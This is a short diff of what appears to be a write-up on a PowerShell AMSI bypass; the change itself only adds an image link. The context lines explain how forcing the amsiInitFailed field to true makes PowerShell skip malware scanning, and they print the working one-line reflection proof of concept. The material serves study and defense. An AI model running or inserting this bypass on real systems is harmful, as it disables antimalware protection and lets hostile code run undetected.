@@ -57,6 +57,7 @@ That field tracks whether AMSI was successfully initialized in the process.
 Sets the value of amsiInitFailed to $true, which tricks PowerShell into thinking AMSI has already failed.
 
 As a result, PowerShell skips AMSI scanning for any future code in that session.
+<img width="892" height="716" alt="image" src="https://github.com/user-attachments/assets/f9a73d39-e7d2-404f-b64d-7e63b1fac9f8" />
 
 Proof of concept: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null, $true)
 Add-Type -AssemblyName PresentationFramework
